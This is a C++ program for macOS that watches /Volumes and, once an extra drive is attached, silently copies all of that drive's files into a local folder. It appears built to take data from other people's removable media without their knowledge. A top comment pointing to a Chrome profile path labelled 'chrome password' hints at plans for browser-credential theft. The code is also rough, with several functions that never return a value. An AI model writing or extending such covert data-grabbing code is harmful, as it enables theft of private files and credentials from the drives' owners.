#include <fstream>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>
#include <vector>
#include <string>
#include <cstring>
#include <iostream>
#include <algorithm>
#include <thread>
#include <chrono>
using namespace std;
// chrome password: /Users/yang/Library/Application Support/Google/Chrome/Default
class copyMgr
{
 public:
   int detect()
   {
      fstream in("/Volumes", ios::binary);
      ofstream out;
      while(1)
      {
         this_thread::sleep_for(std::chrono::milliseconds(1000));
         vector<string> files;
         listdir(files, "", "/Volumes");
         cout << files.size() << endl;

         if(files.size() > 1)
         {
            this_thread::sleep_for(std::chrono::milliseconds(1000));
            copydir("", string("/Volumes/") + files[1]);
            break;
         }
      }
   }
 private:
   int copy(string dir, string name)
   {
      
      ifstream in(dir + "/" + name, ios::binary);
      cout << name << endl;
      if(!in)
      {
         cout << "not exist" << endl;
         return 0;
      }
      ofstream out;
      out.open("copyfiles/" + string("copy_") + name, ios::binary);
      char c;
      while (true)
      {
         c = in.get();
         if (in.eof())
            break;
         out.put(c);
      }
      in.close();
      out.close();
      return 1;
      //cout << name << endl;
   }
   int copydir(const string &prefix, const string &dir = ".") //copy the dir recursively
   {
      vector<string> files;
      DIR *dp;
      dirent *dirp; //dir's entry
      if ((dp = opendir(dir.c_str())) == NULL)
      {
         cerr << "Error(" << errno << "): failed to open " << dir << "!!\n";
         return errno;
      }
      else
      {
         const char *pp = prefix.size() ? prefix.c_str() : 0;
         while ((dirp = readdir(dp)) != NULL)
         {
            DIR *folder;
            if (string(dirp->d_name) == "." || string(dirp->d_name) == ".." || string(dirp->d_name) == ".DS_Store") //links & system files
               continue;
            if ((folder = opendir((dir + "/" + string(dirp->d_name)).c_str())) != NULL) //dir
            {
               copydir("", dir + "/" + string(dirp->d_name));
               continue;
            }
            if (!pp || strncmp(dirp->d_name, pp, prefix.size()) == 0) //files
               files.push_back(string(dirp->d_name));
         }
         sort(files.begin(), files.end());
         for(int i = 0; i < files.size(); i++)
            copy(dir, files[i]);
      }
   }
   int listdir(vector<string> &files, const string &prefix, const string &dir = ".")
   {

      DIR *dp;
      dirent *dirp; //dir's entry
      if ((dp = opendir(dir.c_str())) == NULL)
      {
         cerr << "Error(" << errno << "): failed to open " << dir << "!!\n";
         return errno;
      }
      else
      {
         const char *pp = prefix.size() ? prefix.c_str() : 0;
         while ((dirp = readdir(dp)) != NULL)
         {
            DIR *folder;
            if (string(dirp->d_name) == "." || string(dirp->d_name) == ".." || string(dirp->d_name) == ".DS_Store")
               continue;
            if (!pp || strncmp(dirp->d_name, pp, prefix.size()) == 0)
               files.push_back(string(dirp->d_name));
         }
         sort(files.begin(), files.end());
      }
   }
};

int main()
{

   copyMgr _copyMgr;
   _copyMgr.detect();
   return 0;
}